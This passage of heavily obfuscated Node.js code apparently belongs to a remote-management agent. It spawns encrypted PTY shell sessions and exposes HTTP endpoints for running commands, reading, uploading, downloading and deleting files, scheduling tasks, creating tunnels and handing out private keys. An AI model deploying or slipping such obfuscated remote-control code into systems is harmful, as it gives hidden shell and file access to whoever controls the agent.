                this[eT(0x697)] = a[eT(0x6e5)];
                continue;
            case '7':
                this[eT(0x278)] = !![];
                continue;
            case '8':
                this[eT(0x4fc)] = new a0aK(![], this['AGENT_PRIVATE_KEY'], this['CONTROL_PUBLIC_KEY']);
                continue;
            case '9':
                this['requestId'] = null;
                continue;
            }
            break;
        }
    }
    async [a0aQ(0x1d3)]() {
        const eU = a0aQ, a = {
                'eOMKb': function (b, c) {
                    return b === c;
                },
                'SERbO': eU(0x346),
                'HxpaJ': function (b, c) {
                    return b === c;
                }
            };
        this[eU(0x256)] && a0C[eU(0x6c8)]('[' + this[eU(0x256)] + eU(0x626));
        if (this[eU(0x457)]) {
            a['eOMKb'](process[eU(0x16d)], a[eU(0x361)]) && this[eU(0x457)][eU(0x49a)] && this[eU(0x2c5)](this[eU(0x457)][eU(0x49a)]);
            try {
                this[eU(0x457)][eU(0x3dd)]();
            } catch (b) {
            }
            this['ptyProcess'] = null;
        }
        if (this[eU(0x4fc)])
            this[eU(0x4fc)][eU(0x407)]();
        if (this[eU(0x254)])
            try {
                a[eU(0x461)](this[eU(0x254)][eU(0x478)], this[eU(0x254)][eU(0x2df)]) && this[eU(0x254)][eU(0x52d)](0x3e8, eU(0x629));
            } catch (c) {
            } finally {
                this[eU(0x254)] = null;
            }
    }
    [a0aQ(0x2c5)](a) {
        try {
            a0q('taskkill\x20/F\x20/T\x20/PID\x20' + a, { 'windowsHide': !![] }, () => {
            });
        } catch (b) {
        }
    }
    ['_handleRawMessage'](a) {
        const eV = a0aQ, b = {
                'NiHtD': function (c, d) {
                    return c === d;
                },
                'NnITX': eV(0x654),
                'MvbqM': function (c, d) {
                    return c(d);
                },
                'OJpdU': eV(0x685)
            };
        if (b['NiHtD'](this[eV(0x697)], b[eV(0x70a)])) {
            if (this['msgResolvers'][eV(0x54b)] > 0x0) {
                const c = this[eV(0x710)]['shift']();
                b[eV(0x5ce)](c, a);
            } else
                this['msgQueue'][eV(0x385)](a);
        } else
            this[eV(0x697)] === b[eV(0x1f0)] && this[eV(0x4a3)](a);
    }
    async [a0aQ(0x4cb)]() {
        const eW = a0aQ, a = {
                'BbbJp': function (b, c) {
                    return b > c;
                }
            };
        if (a['BbbJp'](this['msgQueue']['length'], 0x0))
            return this[eW(0x51b)][eW(0x660)]();
        return new Promise(b => {
            const eX = eW;
            this['msgResolvers'][eX(0x385)](b);
        });
    }
    async [a0aQ(0x65e)](a) {
        const eY = a0aQ, b = {
                'GAhjl': function (c, d) {
                    return c(d);
                },
                'SyEdX': eY(0x1e0),
                'cnvUx': function (c, d) {
                    return c > d;
                },
                'pBsMW': eY(0x149),
                'jvLTs': function (c, d) {
                    return c(d);
                },
                'xtlHk': eY(0x16b),
                'WXrol': '加密握手失败'
            };
        b[eY(0x3e2)](a, b[eY(0x74d)]);
        try {
            await this[eY(0x4fc)][eY(0x30d)]();
            const c = await this[eY(0x4cb)](), d = this[eY(0x4fc)][eY(0x67a)](c);
            d && b[eY(0x29b)](d[eY(0x54b)], 0x0) && this[eY(0x254)][eY(0x166)](d);
            const f = await this[eY(0x4cb)]();
            this[eY(0x4fc)][eY(0x67a)](f);
            if (!this[eY(0x4fc)][eY(0x582)])
                throw new Error(b[eY(0x2a5)]);
            b[eY(0x253)](a, b[eY(0x67f)]);
        } catch (g) {
            a('💥\x20握手失败详情:\x20' + g['message']);
            throw new Error(b[eY(0x563)]);
        }
    }
    [a0aQ(0x505)]() {
        const eZ = a0aQ, a = {
                'mGYCU': function (d, f) {
                    return d === f;
                },
                'hrcli': eZ(0x346),
                'pMstK': eZ(0x4cf),
                'MtoXN': eZ(0x4dc),
                'AgUfd': eZ(0x466),
                'wOcIr': eZ(0x41d),
                'SKvCk': eZ(0x352),
                'HSsHL': eZ(0x46f),
                'HJCKp': eZ(0x6ed)
            };
        if (a['mGYCU'](process[eZ(0x16d)], a[eZ(0x137)])) {
            const d = process.env.SystemRoot || eZ(0x151), f = [
                    a0n[eZ(0x6e2)](d, a['pMstK'], a['MtoXN'], a[eZ(0x163)], a['wOcIr']),
                    process.env.COMSPEC,
                    a0n[eZ(0x6e2)](d, a['pMstK'], eZ(0x352))
                ];
            for (const g of f) {
                if (g && a0l['existsSync'](g))
                    return g;
            }
            return a['SKvCk'];
        }
        const b = [
            eZ(0x6eb),
            a[eZ(0x688)],
            eZ(0x307)
        ];
        for (const h of b) {
            if (a0l[eZ(0x617)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[eZ(0x617)](c))
            return c;
        return a['HJCKp'];
    }
    async ['startSession'](a, b, c) {
        const f0 = a0aQ, d = {
                'VvMUo': f0(0x42f),
                'qgAap': f0(0x2bf),
                'YwftS': f0(0x257),
                'JRKVl': function (g, h) {
                    return g(h);
                }
            };
        this[f0(0x254)] = a, this['requestId'] = b;
        const f = g => a0C[f0(0x6c8)](f0(0x784) + b + ']\x20' + g);
        this[f0(0x278)] = !c, f(this[f0(0x278)] ? d[f0(0x705)] : d['qgAap']), a['on'](d[f0(0x504)], g => this[f0(0x692)](g));
        try {
            this[f0(0x278)] && await this[f0(0x65e)](f), await this[f0(0x585)](f);
        } catch (g) {
            d['JRKVl'](f, f0(0x69f) + g[f0(0x257)]), await this[f0(0x1d3)]();
        }
    }
    async [a0aQ(0x585)](a) {
        const f1 = a0aQ, b = {
                'PkRDu': function (g, h) {
                    return g(h);
                },
                'qqeea': f1(0x764),
                'MVwxq': function (g, h) {
                    return g(h);
                },
                'RTCja': function (g) {
                    return g();
                },
                'FPXqP': f1(0x402),
                'SDUHR': f1(0x346),
                'KfkWW': function (g, h) {
                    return g(h);
                },
                'YKzbi': function (g, h) {
                    return g(h);
                },
                'UtNtp': f1(0x685),
                'DXDGN': function (g, h) {
                    return g > h;
                },
                'dxctK': f1(0x52d),
                'JnEPI': function (g, h) {
                    return g(h);
                }
            }, c = this['getAvailableShell']();
        b[f1(0x75f)](a, '🐚\x20使用\x20Shell\x20路径:\x20' + c);
        const d = Object['assign']({}, process.env);
        delete d[f1(0x711)], d[f1(0x310)] = f1(0x402);
        if (!d[f1(0x1d2)])
            d[f1(0x1d2)] = f1(0x4e0);
        const f = b[f1(0x331)](a0D);
        try {
            const g = {
                'name': b[f1(0x2be)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': f,
                'env': d
            };
            if (process[f1(0x16d)] === b[f1(0x76b)])
                try {
                    this[f1(0x457)] = a0B[f1(0x474)](c, [], g);
                } catch (h) {
                    b['KfkWW'](a, f1(0x637) + h[f1(0x257)]), this[f1(0x457)] = new a0aL(c, d, f), this[f1(0x457)]['spawn']();
                }
            else
                this[f1(0x457)] = a0B['spawn'](c, [], g);
            b['YKzbi'](a, f1(0x4f1) + (this[f1(0x457)]['pid'] || 'unknown') + ')'), this[f1(0x697)] = b['UtNtp'];
            while (b['DXDGN'](this[f1(0x51b)][f1(0x54b)], 0x0)) {
                const i = this[f1(0x51b)][f1(0x660)]();
                this[f1(0x4a3)](i);
            }
            this[f1(0x457)][f1(0x443)](j => {
                const f2 = f1;
                try {
                    let k = Buffer[f2(0x6ef)](j, f2(0x17a));
                    this['useNoise'] && this[f2(0x4fc)] && this[f2(0x4fc)][f2(0x582)] && (k = this['cipher']['encrypt'](k)), this[f2(0x254)][f2(0x478)] === 0x1 && this[f2(0x254)][f2(0x166)](k);
                } catch (l) {
                }
            }), this[f1(0x457)][f1(0x3cb)](({
                exitCode: j,
                signal: k
            }) => {
                const f3 = f1;
                b[f3(0x48c)](a, f3(0x46e) + j + f3(0x4da) + k + ')'), this['cleanup']();
            }), this[f1(0x254)]['on'](b[f1(0x171)], () => {
                const f4 = f1;
                b[f4(0x48c)](a, b[f4(0x1ed)]), this[f4(0x1d3)]();
            });
        } catch (j) {
            b[f1(0x6e6)](a, f1(0x5a1) + j[f1(0x257)]), await this[f1(0x1d3)]();
            throw j;
        }
    }
    [a0aQ(0x4a3)](a) {
        const f5 = a0aQ, b = {
                'sfGnR': function (c, d) {
                    return c === d;
                },
                'ICVaf': f5(0x162),
                'QnNAB': function (c, d) {
                    return c === d;
                },
                'UzCvC': f5(0x4a1),
                'JiUIQ': function (c, d) {
                    return c === d;
                },
                'EDfCC': f5(0x3c5),
                'jLzHS': function (c, d) {
                    return c !== d;
                },
                'njASq': 'base64'
            };
        if (!this[f5(0x457)])
            return;
        try {
            const c = Buffer[f5(0x6ef)](a);
            let d;
            this['useNoise'] ? d = this[f5(0x4fc)][f5(0x32d)](c) : d = c;
            let f = ![], g = d[f5(0x6b0)](f5(0x17a));
            if (g[f5(0x42d)]()[f5(0x214)]('{'))
                try {
                    const h = JSON[f5(0x65d)](g);
                    f = !![];
                    if (b[f5(0x258)](h[f5(0x4b3)], b[f5(0x73c)])) {
                        let i = Buffer[f5(0x6ef)](JSON[f5(0x542)]({ 'type': f5(0x162) }));
                        if (this[f5(0x278)])
                            i = this['cipher'][f5(0x344)](i);
                        this[f5(0x254)]['send'](i);
                        return;
                    }
                    if (b[f5(0x671)](h[f5(0x4b3)], b['UzCvC'])) {
                        this[f5(0x457)][f5(0x4a1)](h[f5(0x70c)] || 0x50, h['rows'] || 0x18);
                        return;
                    }
                    if (b[f5(0x6ff)](h['type'], b[f5(0x3b5)]) && b['jLzHS'](h[f5(0x3a4)], undefined)) {
                        let j = b[f5(0x258)](h['encoding'], f5(0x1fc)) ? Buffer[f5(0x6ef)](h['data'], b[f5(0x625)])[f5(0x6b0)](f5(0x17a)) : h['data'];
                        this[f5(0x457)][f5(0x336)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[f5(0x457)][f5(0x336)](d[f5(0x6b0)]('utf-8'));
        } catch (l) {
            a0C[f5(0x6c8)](f5(0x784) + this['requestId'] + ']\x20⚠️\x20指令处理异常:\x20' + l[f5(0x257)]);
            if (this[f5(0x278)])
                this[f5(0x1d3)]();
        }
    }
}
async function a0aN(a = {}) {
    const f6 = a0aQ, b = {
            'kznNA': f6(0x774),
            'VgkHy': f6(0x78a),
            'CZwvL': 'GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS',
            'kALfP': f6(0x51d),
            'OKzNq': f6(0x127),
            'sAqQx': f6(0x406),
            'IKomH': function (c, d) {
                return c - d;
            },
            'GWUpd': f6(0x1a7),
            'DBKzd': function (c, d) {
                return c === d;
            },
            'dRvVO': function (c, d) {
                return c === d;
            },
            'JtdtU': f6(0x3bf),
            'gNkXs': function (c, d) {
                return c !== d;
            },
            'XhuUH': function (c, d) {
                return c < d;
            },
            'dnAQM': function (c, d) {
                return c > d;
            },
            'BjBVm': function (c, d) {
                return c(d);
            },
            'HfRmW': function (c, d) {
                return c(d);
            },
            'TgIZv': '1|2|3|0|4',
            'LaIsp': function (c, d) {
                return c / d;
            },
            'ArZEQ': f6(0x131),
            'ElXUP': f6(0x5f4),
            'HfRyC': f6(0x728),
            'elbGo': f6(0x6d5),
            'RmcFC': 'x-chunk-id',
            'qYCrl': function (c, d) {
                return c || d;
            },
            'fMXEo': f6(0x5de),
            'pwwDU': function (c, d, f) {
                return c(d, f);
            },
            'kRfvL': function (c, d) {
                return c !== d;
            },
            'NqyCL': f6(0x1e6),
            'LlmLw': f6(0x1fc),
            'psEAO': f6(0x538),
            'jSflk': f6(0x77b),
            'eeNkS': f6(0x464),
            'Yfrjd': f6(0x27c),
            'TCylN': function (c, d, f) {
                return c(d, f);
            },
            'RtEKM': function (c, d) {
                return c(d);
            },
            'HuyuW': function (c, d) {
                return c === d;
            },
            'smExA': function (c, d) {
                return c < d;
            },
            'BJjgR': function (c, d) {
                return c(d);
            },
            'SnaRQ': function (c, d) {
                return c > d;
            },
            'OqumS': function (c, d) {
                return c ?? d;
            },
            'idqmQ': 'port\x20is\x20required\x20and\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'OVvHS': 'Missing\x20request_id',
            'NBWID': f6(0x17a),
            'blwJA': f6(0x134),
            'wlRLC': f6(0x315),
            'Cxwym': f6(0x2ad),
            'HodZa': 'Initializing\x20CryptoManager...',
            'XXkdZ': f6(0x471),
            'odXTd': f6(0x5fc),
            'Mzfsg': f6(0x322),
            'IwyTk': 'TempKeyManager\x20initialized',
            'VfXlX': 'Initializing\x20SystemInfoCollector...',
            'byEmL': f6(0x528),
            'vYpvd': f6(0x20e),
            'nJMqB': function (c) {
                return c();
            },
            'LwtCA': function (c, d) {
                return c(d);
            },
            'HiwgQ': f6(0x6d6),
            'nVOsV': f6(0x1a0),
            'UzsNR': f6(0x4fd),
            'StpyE': f6(0x56f),
            'SGOkE': f6(0x51f),
            'dwpqt': '/api/file/authority',
            'LjHXW': f6(0x3e1),
            'jJDzU': '/api/file',
            'kRGQv': f6(0x31a),
            'LIuVN': '/api/file/download',
            'vljzj': '/api/file/cp',
            'RsjKp': f6(0x5c6),
            'zIAnV': f6(0x52e),
            'ckNoM': f6(0x4be),
            'wgsao': f6(0x11b),
            'SjzPF': f6(0x19a),
            'qSDgg': f6(0x20f),
            'JXzNg': f6(0x687),
            'aqLJd': '/api/argo',
            'pnDld': f6(0x5aa),
            'xTHmT': f6(0x534),
            'NScfA': 'WebSocket\x20route\x20configured',
            'JSeYH': f6(0x59f),
            'xsfuT': 'SIGINT\x20handler\x20registered'
        };
    try {
        const c = await import(f6(0x2ef));
        a0z = c[f6(0x320)];
        const d = await import('@noble/curves/secp256k1.js');
        a0A = d['secp256k1'], a0C[f6(0x66e)]('Starting\x20main()\x20function...'), a0O['merge'](a), a0C[f6(0x66e)](b['Cxwym']), a0O[f6(0x31b)](), a0C['debug'](f6(0x45a)), a0C[f6(0x66e)](b[f6(0x3d9)]);
        const f = new a0Q(a0O[f6(0x4b0)], a0O['ECIES_PUBLIC_KEY_PEM']);
        a0C[f6(0x66e)](b['XXkdZ']);
        !a0O[f6(0x2ed)] && !f[f6(0x5cd)] && (a0C[f6(0x3bf)](b[f6(0x4ed)]), a0C[f6(0x3bf)](b[f6(0x111)]), process[f6(0x6c0)](0x1));
        a0C[f6(0x66e)](f6(0x724));
        const g = new a0P();
        g[f6(0x18e)] = () => a0O['rotateOperationalSecrets'](), a0C[f6(0x66e)](b[f6(0x6d4)]), a0C[f6(0x66e)](b['VfXlX']);
        const h = new a0T();
        a0C[f6(0x66e)](b[f6(0x4f2)]), a0C['debug'](b['vYpvd']);
        const i = b[f6(0x55b)](a0f);
        b['LwtCA'](a0w, i), a0C[f6(0x66e)](b[f6(0x3f0)]), i['use']((m, n, o) => {
            const f7 = f6, p = b[f7(0x3bb)][f7(0x696)]('|');
            let q = 0x0;
            while (!![]) {
                switch (p[q++]) {
                case '0':
                    n[f7(0x136)](f7(0x5b1), '*');
                    continue;
                case '1':
                    o();
                    continue;
                case '2':
                    if (m[f7(0x2e7)] === b['VgkHy'])
                        return n[f7(0x296)](0xc8)[f7(0x2b5)]();
                    continue;
                case '3':
                    n[f7(0x136)](f7(0x5ad), b[f7(0x627)]);
                    continue;
                case '4':
                    n[f7(0x136)](b[f7(0x6c1)], f7(0x2a6));
                    continue;
                case '5':
                    n['header'](b[f7(0x678)], b[f7(0x115)]);
                    continue;
                }
                break;
            }
        }), i['use'](a0f[f6(0x6fc)]({
            'type': m => m[f6(0x5ae)] !== '/api/fileraw',
            'limit': b[f6(0x761)]
        })), i[f6(0x29d)](a0f[f6(0x58c)]({ 'extended': !![] })), i[f6(0x29d)](a0S(f, g)), a0C['debug'](b[f6(0x5be)]), i['get'](f6(0x4bd), async (m, n) => {
            const f8 = f6;
            try {
                const o = Math[f8(0x527)](Date[f8(0x27f)]() / 0x3e8);
                !a0O[f8(0x13d)] || b[f8(0x6dd)](o, a0O['_baseinfo_cache_time']) > a0O[f8(0x1be)] ? (!a0O['_baseinfo_fetch_promise'] && (a0O[f8(0x580)] = h['getBasicInfo']()[f8(0x689)](q => {
                    const f9 = f8, r = f9(0x61c)[f9(0x696)]('|');
                    let s = 0x0;
                    while (!![]) {
                        switch (r[s++]) {
                        case '0':
                            a0O[f9(0x347)] = Math[f9(0x527)](Date[f9(0x27f)]() / 0x3e8);
                            continue;
                        case '1':
                            return q;
                        case '2':
                            a0O[f9(0x13d)] = q;
                            continue;
                        case '3':
                            a0O['_baseinfo_fetch_promise'] = null;
                            continue;
                        case '4':
                            a0C[f9(0x66e)](f9(0x63f));
                            continue;
                        }
                        break;
                    }
                })['catch'](q => {
                    const fa = f8;
                    a0O[fa(0x580)] = null;
                    throw q;
                })), await a0O[f8(0x580)]) : a0C[f8(0x66e)](b[f8(0x5bb)]);
                const p = { ...a0O[f8(0x13d)] };
                b[f8(0x167)](m[f8(0x4ac)], !![]) ? (p[f8(0x6b5)] = a0O[f8(0x547)], p[f8(0x745)] = a0O[f8(0x45d)]) : (p['session_key'] = null, p[f8(0x745)] = null), n[f8(0x707)](p), b[f8(0x735)](a0O[f8(0x583)], '1') && a0aG[f8(0x593)]();
            } catch (q) {
                n[f8(0x296)](0x1f4)[f8(0x707)]({
                    'status': b[f8(0x5d8)],
                    'message': q[f8(0x257)]
                });
            }
        }), i[f6(0x4b8)](b['StpyE'], (m, n) => {
            const fb = f6;
            let o = a0O['TEMPKEY_DEFAULT_TTL_HOURS'];
            if (b[fb(0x1ff)](m[fb(0x188)][fb(0x235)], undefined)) {
                const r = parseInt(m['query']['ttl'], 0xa);
                if (Number[fb(0x3a0)](r) || b['XhuUH'](r, 0x1) || b['dnAQM'](r, a0O[fb(0x1eb)]))
                    return n[fb(0x296)](0x1a6)[fb(0x707)]({ 'error': fb(0x295) + a0O[fb(0x1eb)] });
                o = r;
            }
            const p = g['getOrCreate'](o), q = s => new Date(s * 0x3e8)['toISOString']()[fb(0x5f7)]('.000Z', 'Z');
            n[fb(0x707)]({
                'status': 'ok',
                'key_id': p[fb(0x110)],
                'ttl_seconds': p['ttl_seconds'],
                'created_at': b[fb(0x54f)](q, p[fb(0x679)]),
                'expires_at': b[fb(0x483)](q, p[fb(0x4b1)]),
                'ecdsa': {
                    'private_key': p[fb(0x2af)][fb(0x42d)](),
                    'public_key': p[fb(0x112)]['trim']()
                },
                'ecies': {
                    'private_key': p[fb(0x60b)],
                    'public_key': p[fb(0x480)]
                }
            });
        }), i[f6(0x4b8)]('/api/status', async (m, n) => {
            const fc = f6, o = {
                    'zqBDh': b[fc(0x494)],
                    'iyGGU': function (p, q) {
                        const fd = fc;
                        return b[fd(0x195)](p, q);
                    }
                };
            try {
                const p = Math['floor'](Date[fc(0x27f)]() / 0x3e8);
                !a0O[fc(0x677)] || p - a0O[fc(0x23a)] > a0O['STATUS_CACHE_TTL'] ? (!a0O[fc(0x132)] && (a0O['_status_fetch_promise'] = h[fc(0x476)]()[fc(0x689)](r => {
                    const fe = fc, s = o[fe(0x20b)][fe(0x696)]('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            a0C[fe(0x66e)](fe(0x6ee));
                            continue;
                        case '1':
                            a0O[fe(0x677)] = r;
                            continue;
                        case '2':
                            a0O[fe(0x23a)] = Math[fe(0x527)](o[fe(0x70f)](Date[fe(0x27f)](), 0x3e8));
                            continue;
                        case '3':
                            a0O[fe(0x132)] = null;
                            continue;
                        case '4':
                            return r;
                        }
                        break;
                    }
                })['catch'](r => {
                    a0O['_status_fetch_promise'] = null;
                    throw r;
                })), await a0O[fc(0x132)]) : a0C['debug'](b[fc(0x6a8)]);
                const q = { ...a0O[fc(0x677)] };
                n['json'](q);
            } catch (r) {
                n[fc(0x296)](0x1f4)[fc(0x707)]({
                    'status': b[fc(0x5d8)],
                    'message': r[fc(0x257)]
                });
            }
        }), i[f6(0x365)](b[f6(0x5dc)], async (m, n) => {
            const ff = f6;
            try {
                let o = null;
                if (typeof m[ff(0x4ca)] === b[ff(0x614)])
                    o = m[ff(0x4ca)][ff(0x42d)]();
                else
                    m[ff(0x4ca)] && typeof m[ff(0x4ca)] === ff(0x43c) && (o = m[ff(0x4ca)][ff(0x781)] || '');
                if (!o)
                    return n['status'](0x190)[ff(0x707)]({
                        'status': 'error',
                        'message': b[ff(0x3db)]
                    });
                const p = await a0U[ff(0x59e)](o, {
                    'cwd': m[ff(0x4ca)]['cwd'],
                    'env': m['body'][ff(0x350)],
                    'timeout': a0O[ff(0x5d1)]
                });
                n['json'](p);
            } catch (q) {
                n['status'](0x1f4)[ff(0x707)]({
                    'status': b[ff(0x5d8)],
                    'message': q[ff(0x257)]
                });
            }
        }), i[f6(0x365)](f6(0x2a4), async (m, n) => {
            const fg = f6;
            try {
                const o = await a0W[fg(0x4e7)](m[fg(0x4ca)][fg(0x5ae)], m['body'][fg(0x14d)]);
                n['json']({
                    'status': 'ok',
                    'count': o[fg(0x54b)],
                    'files': o
                });
            } catch (p) {
                n[fg(0x296)](0x1f4)['json']({
                    'status': b[fg(0x5d8)],
                    'message': p[fg(0x257)]
                });
            }
        }), i[f6(0x365)](f6(0x670), async (m, n) => {
            const fh = f6;
            try {
                const o = await a0W['getFilePermissions'](m[fh(0x4ca)][fh(0x757)] || []);
                n[fh(0x707)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[fh(0x296)](0x1f4)[fh(0x707)]({
                    'status': b[fh(0x5d8)],
                    'message': p[fh(0x257)]
                });
            }
        }), i[f6(0x4c8)](b[f6(0x6db)], async (m, n) => {
            const fi = f6;
            try {
                const o = m[fi(0x4ca)][fi(0x75e)] || {}, p = b[fi(0x167)](m['body'][fi(0x14d)], !![]), q = await a0W[fi(0x409)](o, p);
                n[fi(0x707)](q);
            } catch (r) {
                n['status'](0x1f4)[fi(0x707)]({
                    'status': fi(0x3bf),
                    'message': r[fi(0x257)]
                });
            }
        }), i['post'](b[f6(0x36a)], async (m, n) => {
            const fj = f6;
            try {
                const o = await a0W['readFile'](m['body'][fj(0x5ae)]);
                n['json'](o);
            } catch (p) {
                n['status'](0x1f4)[fj(0x707)]({
                    'status': 'error',
                    'message': p[fj(0x257)]
                });
            }
        }), i[f6(0x365)](b[f6(0x17c)], async (m, n) => {
            const fk = f6;
            try {
                const o = await a0W[fk(0x5b8)](m[fk(0x4ca)][fk(0x5ae)], m[fk(0x4ca)][fk(0x633)], m['body'][fk(0x1bc)], m[fk(0x4ca)][fk(0x15d)], m[fk(0x4ca)]['total_chunks']);
                n[fk(0x707)](o);
            } catch (p) {
                n[fk(0x296)](0x1f4)[fk(0x707)]({
                    'status': b[fk(0x5d8)],
                    'message': p[fk(0x257)]
                });
            }
        }), i[f6(0x365)](b[f6(0x14f)], a0f[f6(0x37e)]({
            'type': b['Yfrjd'],
            'limit': f6(0x1a0)
        }), async (m, n) => {
            const fl = f6;
            try {
                const o = decodeURIComponent(m[fl(0x759)][b[fl(0x604)]] || ''), p = b[fl(0x483)](decodeURIComponent, m[fl(0x759)][fl(0x208)] || ''), q = m['headers'][b[fl(0x146)]], r = m['headers'][fl(0x241)];
                if (b[fl(0x488)](!o, !p))
                    return n[fl(0x296)](0x190)[fl(0x707)]({
                        'status': b[fl(0x5d8)],
                        'completed': ![],
                        'message': b[fl(0x66b)]
                    });
                const s = b['gNkXs'](q, undefined) ? b[fl(0x184)](parseInt, b[fl(0x483)](String, q), 0xa) : null, t = b['kRfvL'](r, undefined) ? b['pwwDU'](parseInt, b[fl(0x483)](String, r), 0xa) : null, u = m['body'];
                if (!Buffer[fl(0x2ba)](u))
                    return n[fl(0x296)](0x190)[fl(0x707)]({
                        'status': b[fl(0x5d8)],
                        'completed': ![],
                        'message': b[fl(0x646)]
                    });
                const v = await a0W[fl(0x54d)](o, p, u, s, t);
                n[fl(0x707)](v);
            } catch (w) {
                n[fl(0x296)](0x1f4)['json']({
                    'status': fl(0x3bf),
                    'completed': ![],
                    'message': w['message']
                });
            }
        }), i[f6(0x365)](b[f6(0x641)], async (m, n) => {
            const fm = f6;
            try {
                const o = await a0W[fm(0x12c)](m['body'][fm(0x5ae)]), p = Buffer[fm(0x6ef)](o[fm(0x1bc)], b[fm(0x44f)]);
                return n[fm(0x2c3)](b[fm(0x496)], o[fm(0x316)][fm(0x6b0)]()), n[fm(0x2c3)](b[fm(0x635)], o[fm(0x5ae)]), n[fm(0x2c3)](b['eeNkS'], b[fm(0x6a4)]), n['send'](p);
            } catch (q) {
                n[fm(0x296)](0x1f4)[fm(0x707)]({
                    'status': b[fm(0x5d8)],
                    'message': q[fm(0x257)]
                });
            }
        }), i[f6(0x56c)](b[f6(0x17c)], async (m, n) => {
            const fn = f6;
            try {
                let o = m[fn(0x4ca)]['paths'];
                if (!o || !Array['isArray'](o)) {
                    o = [];
                    if (m[fn(0x4ca)][fn(0x5ae)])
                        o[fn(0x385)](m[fn(0x4ca)][fn(0x5ae)]);
                    if (m['body'][fn(0x339)])
                        o[fn(0x385)](m[fn(0x4ca)]['path2']);
                }
                const p = await a0W[fn(0x449)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n['status'](0x1f4)['json']({
                    'status': b[fn(0x5d8)],
                    'message': q[fn(0x257)]
                });
            }
        }), i[f6(0x4c8)](b[f6(0x17c)], async (m, n) => {
            const fo = f6;
            try {
                const o = await a0W[fo(0x18c)](m[fo(0x4ca)][fo(0x308)] || m[fo(0x4ca)]);
                n[fo(0x707)]({
                    'status': 'ok',
                    'total': o['length'],
                    'success': o[fo(0x6ab)](p => p['status'] === 'ok')[fo(0x54b)],
                    'results': o
                });
            } catch (p) {
                n[fo(0x296)](0x1f4)[fo(0x707)]({
                    'status': b[fo(0x5d8)],
                    'message': p[fo(0x257)]
                });
            }
        }), i[f6(0x365)](b['vljzj'], async (m, n) => {
            const fp = f6;
            try {
                const o = await a0W['copyFiles'](m[fp(0x4ca)]);
                n[fp(0x707)]({
                    'status': 'ok',
                    'total': o['length'],
                    'success': o[fp(0x6ab)](p => p[fp(0x296)] === 'ok')[fp(0x54b)],
                    'results': o
                });
            } catch (p) {
                n[fp(0x296)](0x1f4)[fp(0x707)]({
                    'status': b[fp(0x5d8)],
                    'message': p[fp(0x257)]
                });
            }
        }), i[f6(0x365)](b[f6(0x6e4)], async (m, n) => {
            const fq = f6;
            try {
                const o = await a0W[fq(0x6b3)](m[fq(0x4ca)][fq(0x5ae)]);
                n[fq(0x707)](o);
            } catch (p) {
                n[fq(0x296)](0x1f4)[fq(0x707)]({
                    'status': b[fq(0x5d8)],
                    'message': p[fq(0x257)]
                });
            }
        }), i[f6(0x4b8)](b[f6(0x6c5)], (m, n) => {
            const fr = f6;
            n[fr(0x707)](a0X['getOnetimeTasks']());
        }), i[f6(0x365)](f6(0x52e), async (m, n) => {
            const ft = f6;
            try {
                const o = await a0X[ft(0x22d)](m['body']);
                n[ft(0x707)](o);
            } catch (p) {
                n[ft(0x296)](0x1f4)['json']({
                    'status': b['JtdtU'],
                    'message': p[ft(0x257)]
                });
            }
        }), i['get'](b['ckNoM'], (m, n) => {
            const fu = f6;
            n['json'](a0X[fu(0x60f)]());
        }), i[f6(0x365)](b['ckNoM'], (m, n) => {
            const fv = f6;
            try {
                const o = a0X[fv(0x1d8)](m[fv(0x4ca)]);
                n[fv(0x707)](o);
            } catch (p) {
                n[fv(0x296)](0x1f4)['json']({
                    'status': fv(0x3bf),
                    'message': p[fv(0x257)]
                });
            }
        }), i[f6(0x4b8)](b[f6(0x250)], (m, n) => {
            const fw = f6;
            n[fw(0x707)](a0X[fw(0x11c)]());
        }), i[f6(0x4b8)](f6(0x20f), (m, n) => {
            const fx = f6;
            let o = parseInt(m[fx(0x188)]['limit'], 0xa) || 0x32;
            o = Math[fx(0x441)](Math[fx(0x3af)](o, 0x1), 0x64), n[fx(0x707)](a0X[fx(0x17e)](o));
        }), i[f6(0x4b8)](b[f6(0x618)], (m, n) => {
            const fy = f6;
            let o = b[fy(0x239)](parseInt, m[fy(0x188)][fy(0x180)], 0xa) || 0x32;
            o = Math[fy(0x441)](Math[fy(0x3af)](o, 0x1), 0x64), n[fy(0x707)](a0X['getCronLogs'](o));
        }), i[f6(0x56c)](b['qSDgg'], (m, n) => {
            const fz = f6;
            n['json'](a0X[fz(0x383)]());
        }), i[f6(0x56c)](f6(0x19a), (m, n) => {
            const fA = f6;
            n['json'](a0X[fA(0x2ec)]());
        }), i[f6(0x4b8)](b[f6(0x5e1)], (m, n) => {
            const fB = f6;
            n[fB(0x707)](a0X['getLogSummary']());
        }), i[f6(0x365)](f6(0x775), async (m, n) => {
            const fC = f6;
            try {
                const o = await a0X[fC(0x255)]();
                n[fC(0x707)](o);
            } catch (p) {
                n[fC(0x296)](0x1f4)[fC(0x707)]({
                    'status': b['JtdtU'],
                    'message': p[fC(0x257)]
                });
            }
        });
        const j = {
                'debug': (...m) => a0C[f6(0x66e)](m[f6(0x6e2)]('\x20')),
                'info': (...m) => a0C[f6(0x6c8)](m[f6(0x6e2)]('\x20')),
                'warning': (...m) => a0C['warn'](m[f6(0x6e2)]('\x20'))
            }, k = new a0aF(j);
        i[f6(0x4b8)](b[f6(0x3f6)], (m, n) => {
            const fD = f6, o = k[fD(0x622)]();
            n[fD(0x707)]({
                'status': 'ok',
                'count': o[fD(0x54b)],
                'tunnels': o
            });
        }), i[f6(0x365)](b[f6(0x3f6)], async (m, n) => {
            const fE = f6;
            try {
                const o = b['RtEKM'](a0aE, m[fE(0x4ca)]);
                let p = o[fE(0x2bb)];
                (b[fE(0x579)](p, undefined) || b[fE(0x579)](p, null) || p === '') && (p = a0O['PORT']);
                const q = Number(p);
                if (!Number[fE(0x44b)](q) || b[fE(0x720)](q, 0x1) || q > 0xffff)
                    return n[fE(0x296)](0x1a6)[fE(0x707)]({
                        'status': b[fE(0x5d8)],
                        'created': ![],
                        'port': p,
                        'message': 'port\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535'
                    });
